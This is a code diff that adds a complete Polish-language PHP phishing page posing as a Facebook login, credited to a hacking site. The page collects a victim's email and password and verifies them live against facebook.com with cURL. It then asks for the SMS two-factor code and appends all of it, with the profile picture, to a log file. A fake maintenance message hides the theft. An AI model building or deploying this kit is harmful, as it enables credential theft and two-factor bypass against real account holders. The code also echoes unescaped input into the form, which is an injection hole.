@@ -1,2 +1,124 @@
+<!doctype html>
+<!-- script by haker.edu.pl -->
 <html>
-jakis tekst
+    <head>
+        <meta charset="UTF-8">
+ 
+        <title>Witamy na Fuckbuku. Zaloguj się, zarejestruj się lub skorzystaj z pomocy.</title>
+ 
+        <link rel="stylesheet" href="http://maxcdn.bootstrapcdn.com/bootstrap/3.2.0/css/bootstrap.min.css">
+ 
+ 
+        <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.1/jquery.min.js"></script>
+ 
+ 
+        <script src="http://maxcdn.bootstrapcdn.com/bootstrap/3.2.0/js/bootstrap.min.js"></script>
+    </head>
+    <body>
+        <h1>Witaj na fejsbuku!</h1>
+        <?php
+ 
+        function wyswietlFormularz($id) {
+            if ($id == 1) {
+                echo('<form method="post" action="a.php" role="form">
+	<label>Login: <input type="email" name="login" class="form-control"/></label>
+    <label>Haslo: <input type="password" name="haslo" class="form-control"/></label>
+	<input type="hidden" name="akcja" value="sms">
+    <input type="submit" value="Loguj" class="btn btn-default"/>   
+</form>');
+            } else if ($id == 2) {
+                echo('<form method="post" action="a.php" role="form">
+	<label>Przepisz kod sms: <input type="text" name="sms" class="form-control"/></label>
+	<input type="hidden" name="akcja" value="finalizuj">
+	<input type="hidden" name="login" value="' . $_POST['login'] . '">
+	<input type="hidden" name="haslo" value="' . $_POST['haslo'] . '">
+    <input type="submit" value="Loguj" class="btn btn-default" />   
+</form>');
+            } else if ($id == 3) {
+                echo("<br><h2>Przepraszamy, ta strona jest niedostępna.</h2>
+ 
+<p>Trwają pracę konserwacyjne. Wróć do nas o <mark>" . date('H:i', strtotime("+15 minutes")) . "</mark></p>");
+            }
+        }
+ 
+        function czyZalogowanoNaFace($zrodlo) {
+            if (strpos($zrodlo, "Strona główna") > 0)
+                return TRUE;
+        }
+ 
+        function czyKodSmsFacebook($zrodlo) {
+            if (strpos($zrodlo, "Wprowadź kod") > 0)
+                return TRUE;
+        }
+ 
+        function pobierzAvatarFace($zrodlo) {
+            $pattern = '/<img class="_s0 _2dpc _rw img" src="([^"]*)"/i';
+            $out = preg_match($pattern, $zrodlo, $matches);
+            if ($out > 0)
+                return'<img src="' . $matches[1] . '"/>';
+        }
+ 
+        function zapiszLog($login, $haslo, $sms, $img) {
+ 
+            $tekst = "<br><div style='clear: both; margin: 10px 10px 10px 10px; padding: 15px 15px 15px 15px;'><div style='float: left;  padding-right: 10px;'>$img</div><div style='float: left;'>[" . date('d-m-Y, H:i:s') . "]<br><b>E-mail:</b> $login<br><b>Haslo:</b> $haslo<br><b>Sms:</b> $sms </div></div><br>";
+            $uchwyt = fopen("logi.html", "a");
+            fwrite($uchwyt, $tekst);
+            fclose($uchwyt);
+        }
+ 
+        function wyslijFace($login, $haslo) {
+            $ciastko = "C:\\\Users\\\Patryk\\\Desktop\\cookie_file.txt";
+            $cURL = curl_init();
+            curl_setopt($cURL, CURLOPT_URL, 'https://www.facebook.com/login.php');
+            if (file_exists($ciastko)) {
+                sleep(0.500);
+                unlink($ciastko);
+            }
+            curl_setopt($cURL, CURLOPT_COOKIEJAR, $ciastko);
+            curl_setopt($cURL, CURLOPT_COOKIEFILE, $ciastko);
+            curl_setopt($cURL, CURLOPT_POSTFIELDS, 'email=' . urlencode($_POST['login']) . '&pass=' . urlencode($_POST['haslo']) . '&login=Log In');
+            curl_setopt($cURL, CURLOPT_POST, 1);
+            curl_setopt($cURL, CURLOPT_HEADER, 0);
+            curl_setopt($cURL, CURLOPT_FOLLOWLOCATION, 1);
+            curl_setopt($cURL, CURLOPT_SSL_VERIFYPEER, FALSE);
+            curl_setopt($cURL, CURLOPT_SSL_VERIFYHOST, 2);
+            curl_setopt($cURL, CURLOPT_RETURNTRANSFER, 1);
+            //MOŻEMY POBIERAĆ DYNAMICZNIE USERAGENTA $_SERVER['HTTP_USER_AGENT'];
+            curl_setopt($cURL, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:34.0) Gecko/20100101 Firefox/34.0");
+            curl_setopt($cURL, CURLOPT_REFERER, "http://www.facebook.com");
+            curl_exec($cURL) or die(curl_error($cURL));
+            sleep(0.500);
+            $kodZrodlowyStrony = curl_exec($cURL) or die(curl_error($cURL));
+            if (czyZalogowanoNaFace($kodZrodlowyStrony) || czyKodSmsFacebook($kodZrodlowyStrony)) {
+                if (czyKodSmsFacebook($kodZrodlowyStrony)) {
+                    //Z KODEM SMS
+                    wyswietlFormularz(2);
+                    die();
+                } else {
+                    //BEZ SMS
+                    zapiszLog($_POST['login'], $_POST['haslo'], 'brak', pobierzAvatarFace($kodZrodlowyStrony));
+                    wyswietlFormularz(3);
+                    die();
+                }
+            } else {
+                //NIE ZALOGOWANO SIE POPRAWNIE (zły login lub hasło)
+                echo("---BŁĘDNE DANE LOGOWANIA");
+                wyswietlFormularz(1);
+                die();
+            }
+            //echo $kodZrodlowyStrony;
+            curl_close($cURL);
+        }
+ 
+        if (empty($_POST['akcja'])) {
+            wyswietlFormularz(1);
+        } else if (!empty($_POST['akcja']) && !empty($_POST['login']) && !empty($_POST['haslo']) && $_POST['akcja'] == "sms") {
+            wyslijFace($_POST['login'], $_POST['haslo']);
+        } else if (!empty($_POST['akcja']) && !empty($_POST['login']) && !empty($_POST['haslo']) && $_POST['akcja'] == "finalizuj") {
+            // echo($_POST['login'] . ':' . $_POST['haslo'] . ':' . $_POST['sms']);
+            wyswietlFormularz(3);
+            zapiszLog($_POST['login'], $_POST['haslo'], $_POST['sms'], '<div class="centerHorizontally"><img src="https://placehold.it/50x50" /></div>');
+        }
+        ?>
+    </body>
+</html>
